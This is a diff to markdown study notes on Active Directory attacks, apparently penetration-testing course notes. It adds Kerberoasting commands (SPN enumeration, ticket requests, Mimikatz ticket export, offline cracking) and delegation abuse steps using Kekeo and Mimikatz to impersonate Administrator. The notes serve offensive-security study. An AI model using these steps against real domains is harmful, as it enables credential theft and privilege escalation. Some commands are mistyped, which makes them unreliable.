@@ -174,7 +174,31 @@
 - Automated continued attempts to guess a password
 
 ### ASREPRoast
-### Kerberoasting
+
+### Kerberoast
+
+- TGS has server position encrypted using service account password hash. 
+  - User can use the TGT to request TGS for any service (no authorization check)
+- Use this to crack the service account password offline.
+- Service account are sometimes ignored and may have privileged access. 
+- Hash could be used to create **Silver Tickets**
+- Tim Medin DebyCon 2014
+
+- Find Service Accounts: 
+  - `GetUserSPNs` 
+  - Powerview: `Get-NetUser -SPN`
+  - AD nodule: `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
+- Request Ticket (TGS):
+  - `Add-Type -AssemblyName System.IdentityModel`
+  - `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<ServicePrincipalName from above commands>"`
+  - PowerView:
+    - `Request-SPNTicket`
+  - `klist` to verify the ticket 
+  - Store to disk using: `Invoke-Mimikatz -Command '"kerberos::list /export"'`
+- Crack:
+  - `.\tgsrepcrack.py .\passwords.txt 'file.kirbi'`
+
+- Note: If full control of user is there, can force-set an `SPN` on the user and then bruteforce.
 
 **References** 
 
@@ -578,11 +602,18 @@ kerberos::golden /domain:<domain>
 2. DC returns TGT
 3. User request TGS for web service
 4. DC provides TGS (TGS contains user's TGT)
-5. User sends TGT and TGS to web Server
+5. User sends TGT and TGS to web Server **Same as usual up to this point**
 6. Web server service account use user's TGT to request a TGS got database server from DC
  - Web server service account can decrypt TGS and extract the user's TGT
  - This is because TGS is encryoted with web server service account's NTLM hash
 7. Web server service account connects to database impersonating the user
+
+- When allowed to a paticular service-account, allows delegation to any service in domain 
+  - by impercenating incoming user
+  - because DC place user's TGT in TGS (step 4)
+  - In example: web server service account can request access to any service in domain as user connecting to it
+  - Usable to escalate privilages (if webserver can be comprimzed)
+    - When a domian admin / high privilaged user connect to machine (Ex: webserver)
 
 - Identifying Nodes with Unconstrained Delegation Enabled
     ```
@@ -607,25 +638,35 @@ kerberos::golden /domain:<domain>
 ### Constrained Kerberos Delegation
 
 - Only provide access to specified services on a specifiv computer
-- Service account must have TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D UserAccountControl attribute
-- Service account can asccess all services specified in msDS-AllowedToDelegateTo attribute
+- Service account must have `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` - `T2A4D` `UserAccountControl` attribute
+- Service account can asccess all services specified in `msDS-AllowedToDelegateTo` attribute
+- Abuse possibllities:
+  - Student authenticate using non-kerberos auth and Protocol Transition is used by Kerberos to support SSO
+  - Delegation occurs ont only got specifid service but for any service running under the same account
+    - No validation for the specific SPN
+  - <https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/> 
+  - Delegation is not restricted by SPN. It's possible to create alternate tickets. 
 
 - Identifying Users with Unconstrained Delegation Enabled
-    ```
+    ```powershell
     Get-DomainUser -TrustedToAuth
     Get-DomainComputer -TrustedToAuth
     ```
-
-    ```
+    ```powershell
     Install-ActiveDirectoryModule -DllPath C:\AdModule\Microsoft.ActiveDirectory.Management.dll ADModulePath C:\AdModule\ActiveDirectory.psd1
 
     Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
     ```
-- Attack Patterns
+- Get cleartext password or NTLM hash of the service account. 
+- Use the above, with `Kekeo`  to get TGT
+  - `asktgt.exe /user:exadmin /domain:example.powershell.local /key:deadbeefdeadbeefdeadbeef /ticket:exadmin.kirbi`
+- Use TGT to get TGS:
+  - Retquest a TGS as the user `/user:Administrator`
+  - `\s4u.exe /tgt:axadmin.kribi /user:Administrator@example.powershell.local /service:cifs/example1.powershell.local`
+- Use TGT
+  - `Invoke-Mimikatz -Command '"kerberos:ppt example.kribi"'`
+  - `ls \\example.powershell.local\c$`
 
-  - Protocol Transition used in SSO
-  - Delegation occurs not only for the specific service but for any service running under the same account. No validation for the SPN specified.
-  - <https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/>
 
 ## Tools 
 
